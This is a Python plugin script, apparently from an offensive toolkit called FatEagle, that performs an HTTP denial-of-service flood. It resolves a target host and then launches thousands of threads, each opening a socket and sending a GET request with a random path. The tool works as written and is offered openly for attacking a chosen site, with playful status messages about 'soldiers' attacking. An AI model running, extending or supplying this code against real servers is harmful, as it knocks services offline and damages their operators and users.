import sys
import fescripts.libs.fescripts
from fescripts.libs.PFable import fable,fable_mode
from colorama import init
init()
from colorama import Fore,Back
import signal
import random
import socket
import string
import threading
import time

class QuantumRequest:
    def signal_handler(self,sig, frame):
      self._end()
    signal.signal(signal.SIGINT, signal_handler)
    _fs = fescripts.libs.fescripts.FE_SCRIPTS("QuantumRequest","a multi thread FeScript that perform a nice DoS Http Attack.","""a multi thread FeScript that perform a nice DoS Http Attack. It generates number of random get requests and sends them to the target.""",{'host': {'Body': '', 'Description': 'target IP or target url in format: site.domain', 'Require': True}, 'port': {'Body': '80', 'Description': 'target port that something running on it', 'Require': True}, 'NoA': {'Body': '10000', 'Description': 'number of attacks or requests sends to target', 'Require': True}},"0xDeviI")
    
    def __init__(self):
      pass
    
    def help(self):
        print(self._fs._totalDesc)
    
    def info(self):
      print(self._fs._miniDesc + "\n    Author: " + self._fs._author)
    
    def _info(self):
      return self._fs._miniDesc

    def allRequirement(self):
      keys = self._fs._Opt.keys()
      allKeys = []
      for i in keys:
        if (self._fs._Opt[i]['Require'] == True):
          allKeys.append(i)
      return allKeys

    def allSwitches(self):
      keys = self._fs._Opt.keys()
      allKeys = []
      for i in keys:
        allKeys.append(i)
      return allKeys

    def _pre_start(self):
      _all_req = self.allRequirement()
      found = False
      for i in _all_req:
        if (self._fs._Opt[i]["Body"] == ""):
          found = True
          break
      if (found):
        print(Fore.RED + "All requirement switches not filled!" + Fore.RESET)   
      else:
        self._start()

    def showSwitch(self,sw):
      print(self._fs._Opt[sw]["Body"])

    thread_num = 0
    thread_num_mutex = threading.Lock()

    def print_status(self):
      global thread_num
      self.thread_num_mutex.acquire(True)

      self.thread_num += 1
      sys.stdout.write(Fore.LIGHTYELLOW_EX + f"\r {time.ctime().split( )[3]} [{str(self.thread_num)}] Wait honey, the soldiers are Attacking!" + Fore.RESET)
      sys.stdout.flush()
      self.thread_num_mutex.release()

    def generate_url_path(self):
      msg = str(string.ascii_letters + string.digits + string.punctuation)
      data = "".join(random.sample(msg, 5))
      return data

    def attack(self,ip,port,host):
      self.print_status()
      url_path = self.generate_url_path()

      dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

      try:
          dos.connect((ip, port))
          byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
          dos.send(byt)
      except socket.error:
          print(Fore.LIGHTGREEN_EX + f"\n [ No connection, server may be down ]: {str(socket.error)}" + Fore.RESET)
      finally:
          # Close our socket gracefully
          dos.shutdown(socket.SHUT_RDWR)
          dos.close()

    def _start(self):
      print("\nFatEagle Script ' " + Fore.YELLOW + self.__class__.__name__ + Fore.RESET + " '" + Fore.GREEN + " Started!" + Fore.RESET)
      # --------------------------------------------> Script Started!
      try:
        host = self._fs._Opt["host"]["Body"]
        ip = ""
        port = int(self._fs._Opt["port"]["Body"])
        noa = int(self._fs._Opt["NoA"]["Body"])
        try:
          host = str(host).replace("https://", "").replace("http://", "").replace("www.", "")
          ip = socket.gethostbyname(host)
        except socket.gaierror:
          print(Fore.LIGHTRED_EX + "ERROR:   something went wrong!\n        Reason: make sure you entered correct host" + Fore.RESET)
        ask = input(f"[#] Attack will start to {host} ({ip}) on Port: {str(port)} with Requests: {str(noa)}.\nAre you sure you want to start attack? (Yes/No): ")
        if (ask.casefold() == "yes".casefold()):
          print(Fore.LIGHTGREEN_EX + "Attack Started!" + Fore.RESET)
          all_threads = []
          for i in range(noa):
            t1 = threading.Thread(target=self.attack,args=(ip,port,host))
            t1.start()
            all_threads.append(t1)
            time.sleep(0.01)

          for current_thread in all_threads:
            current_thread.join()
      except:
        print(Fore.LIGHTRED_EX + "ERROR:   something went wrong!\n        Reason: 'port' or 'NoA' could be invalid" + Fore.RESET)
      # --------------------------------------------> Script Stopped!
      self._end()

    def _end(self):
      print("\nFatEagle Script ' " + Fore.YELLOW + self.__class__.__name__ + Fore.RESET + " '" + Fore.RED + " Stopped!\n\n" + Fore.RESET)
    
    def missedSwitch(self):
      fable_data = []
      keys = self._fs._Opt.keys()
      for i in keys:
        if (self._fs._Opt[i].get("Require") == True and self._fs._Opt[i].get("Body") == ""):
          fable_data.append([i,self._fs._Opt[i].get("Body"),self._fs._Opt[i].get("Description")])
      fabled = fable(["switch name","value","descrption"],fable_data,fable_mode.SLICED)
      print(fabled.popData())

    def switchInfo(self):
      fable_data = []
      keys = self._fs._Opt.keys()
      for i in keys:
        fable_data.append([i,self._fs._Opt[i].get("Body"),str(self._fs._Opt[i].get("Require")),self._fs._Opt[i].get("Description")])
      fabled = fable(["switch name","value","required","descrption"],fable_data,fable_mode.SLICED)
      print(fabled.popData())
    
    def setSwitch(self,prop,value):
      self._fs._Opt[prop]["Body"] = value
